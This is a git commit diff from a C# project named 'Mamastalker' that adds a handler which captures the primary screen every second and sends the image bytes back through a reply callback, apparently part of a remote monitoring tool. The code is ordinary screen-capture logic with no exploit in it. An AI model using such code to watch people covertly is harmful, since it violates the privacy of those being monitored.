d6669d53d2bec18825b0495b91bd58c127657396
TomerGabriel <tomergabriel@gmail.com>
2022-01-20 11:15:09 +0200

    implement screenshot on timer

--- Mamastalker/Mamastalker.Common.FormsPresentation/ResponseHandlers/ScreenshotOnTimerResponseHandler.cs
+++ Mamastalker/Mamastalker.Common.FormsPresentation/ResponseHandlers/ScreenshotOnTimerResponseHandler.cs
@@ -1,16 +1,29 @@
-﻿using Mamastalker.Server.Logic.ResponseHandlers.Abstract;
+﻿using Mamastalker.Common.Logic.DataConverters.Abstract;
+using Mamastalker.Server.Logic.ResponseHandlers.Abstract;
 using System;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Mamastalker.Common.FormsPresentation.ResponseHandlers
 {
     public class ScreenshotOnTimerResponseHandler<TData> : IResponseHandler<TData>
     {
+        private readonly IDataConverter<Bitmap, byte[]> _bitmapToByteArrayConverter;
+
         private Action<byte[]> _listeningCallback;
+
+        public bool Running { get; set; }
+
+        public ScreenshotOnTimerResponseHandler(IDataConverter<Bitmap, byte[]> bitmapToByteArrayConverter)
+        {
+            _bitmapToByteArrayConverter = bitmapToByteArrayConverter;
+        }
 
         private async Task UpdateLoop()
         {
-            while (true)
+            while (Running)
             {
                 await Task.Delay(1000);
 
@@ -20,9 +33,36 @@ namespace Mamastalker.Common.FormsPresentation.ResponseHandlers
 
         private void SendScreenshot()
         {
-            // var byteData;
+            var screen = Screen.PrimaryScreen;
 
-            // _listeningCallback?.Invoke(byteData);
+            var bitmap = new Bitmap(screen.Bounds.Width,
+                                    screen.Bounds.Height,
+                                    PixelFormat.Format32bppArgb);
+
+            var graphics = Graphics.FromImage(bitmap);
+
+            graphics.CopyFromScreen(screen.Bounds.X,
+                                    screen.Bounds.Y,
+                                    0,
+                                    0,
+                                    screen.Bounds.Size,
+                                    CopyPixelOperation.SourceCopy);
+
+            var byteData = _bitmapToByteArrayConverter.Parse(bitmap);
+
+            _listeningCallback?.Invoke(byteData);
+        }
+
+        public async Task StartUpdateLoop()
+        {
+            if (Running)
+            {
+                return;
+            }
+
+            Running = true;
+
+            await UpdateLoop();
         }
 
         public void HandleData(TData data, Action<byte[]> reply)
